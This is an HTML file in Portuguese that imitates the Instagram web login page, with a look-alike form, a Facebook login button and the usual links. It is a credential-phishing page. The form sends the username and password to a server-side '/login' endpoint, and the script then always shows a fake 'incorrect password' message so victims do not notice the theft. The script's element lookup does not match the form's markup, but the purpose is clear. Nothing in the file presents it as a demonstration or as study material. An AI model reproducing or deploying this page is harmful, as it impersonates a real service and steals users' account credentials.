<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Web Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
  <style>
    body { font-family: Arial, sans-serif; background: #fafafa; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    .login-box { background:#fff; border:1px solid #dbdbdb; padding:40px; width:300px; text-align:center; }
    .login-box h1 { font-family:'Great Vibes', cursive; font-size:36px; margin-bottom:20px; }
    input { width:100%; padding:10px; margin:8px 0; border:1px solid #dbdbdb; border-radius:4px; }
    button { width:100%; padding:10px; background:#0095f6; color:#fff; border:none; border-radius:4px; font-weight:bold; cursor:pointer; }
    button:hover { background:#007acc; }
    .or { margin:15px 0; color:#999; font-weight:bold; font-size:12px; }
    .facebook-btn { width:100%; padding:10px; background:#1877f2; color:#fff; border:none; border-radius:4px; font-weight:bold; cursor:pointer; margin-bottom:15px; }
    .facebook-btn:hover { background:#0f5bb5; }
    .links { margin-top:5px; font-size:14px; }
    .links a { color:#0095f6; text-decoration:none; font-weight:bold; margin-left:5px; }
    .links a:hover { text-decoration:underline; }
  </style>
</head>
<body>
  <div class="login-box">
    <h1>Instagram</h1>
    <form action="/login" method="POST">
      <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit">Entrar</button>
    </form>

    <div class="or">OU</div>
    <button class="facebook-btn">Entrar com Facebook</button>

    <!-- Mensagem de erro -->
    <div id="errorMsg" class="error-message">Sua senha está incorreta. Confira-a.</div>

    <div class="links"><a href="#">Esqueceu sua senha?</a></div>
    <div class="links" style="margin-top:10px; color:#000;">Não tem uma conta?<a href="#">Cadastre-se</a></div>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const errorMsg = document.getElementById("errorMsg");

    form.addEventListener("submit", function(event) {
      event.preventDefault(); // evita redirecionar

      fetch(form.action, {
        method: form.method,
        body: new FormData(form)
      }).finally(() => {
        // mostra a mensagem de erro logo após o clique, sem redirecionar
        errorMsg.style.display = "block";
      });
    });
  </script>
</body>
</html>
